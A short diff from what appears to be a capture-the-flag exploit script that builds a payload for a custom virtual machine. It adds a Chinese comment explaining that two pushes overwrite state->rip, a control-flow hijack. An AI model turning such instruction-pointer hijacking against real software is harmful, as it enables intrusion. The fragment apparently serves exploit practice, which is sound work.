@@ -150,6 +150,8 @@ payload += push_reg(1)  # 0x61
 
 payload += mov_reg(3, 0xF6)
 payload += mov_reg(4, 0xFF)
+
+# 此处两个push，是为了改写state->rip
 payload += mov_reg(2, 0x7FFFFFFFFFFF)
 payload += push_reg(2)  # rbp
 payload += push_num(0x61)
